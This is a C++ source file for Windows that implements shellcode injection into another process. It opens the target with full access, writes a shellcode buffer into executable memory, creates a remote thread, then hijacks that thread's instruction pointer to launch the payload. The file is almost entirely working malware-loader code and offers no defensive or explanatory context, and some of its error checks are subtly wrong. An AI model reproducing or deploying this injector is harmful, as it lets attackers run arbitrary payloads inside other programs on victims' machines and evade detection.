#include <Windows.h>
#include <TlHelp32.h>

#include "debug.hpp"
#include "inject.hpp"
#include "config.hpp"

DWORD WINAPI sleep(void) {
	Sleep(10000000);
	return 0;
}

bool try_inject(int pid) {
	HANDLE phandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if (phandle == INVALID_HANDLE_VALUE) {
		debug("Cannot get process handle");
		getlasterr();
		return false;
	}

	void* buffer = VirtualAllocEx(
		phandle, NULL, LEN*sizeof(char), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE
	);

	if (buffer == NULL) {
		debug("Cannot alloc");
		getlasterr();
		return false;
	}

	if (!WriteProcessMemory(phandle, buffer, SC, LEN*sizeof(char), NULL)) {
		debug("Cannot write to allocated memory");
		getlasterr();
		return false;
	}

	HANDLE thread_handle = CreateRemoteThread(phandle, NULL, 0, (LPTHREAD_START_ROUTINE)sleep, NULL, 0, NULL);
	if (thread_handle == INVALID_HANDLE_VALUE) {
		debug("Cannot create thread");
		return false;
	}

	// hijacking thread and finaly launching the shellcode
	CONTEXT context;
	context.ContextFlags = CONTEXT_FULL;

	if(!SuspendThread(thread_handle)==-1){
		debug("Thread suspension failed");
		getlasterr();
		return false;
	}

	if(!GetThreadContext(thread_handle, &context)) {
		debug("Cannot get context");
		getlasterr();
		return false;
	}

#ifdef _WIN64
	context.Rip = (DWORD_PTR)buffer;
#else
	context.Eip = (DWORD_PTR)buffer;
#endif

	if(!SetThreadContext(thread_handle, &context)) {
		debug("Cannot set context");
		getlasterr();
		return false;
	}

	debug("Resuming thread");
	if(!ResumeThread(thread_handle)==-1){
		debug("Cannot resume the thread");
		getlasterr();
		return false;
	}

	return true;
}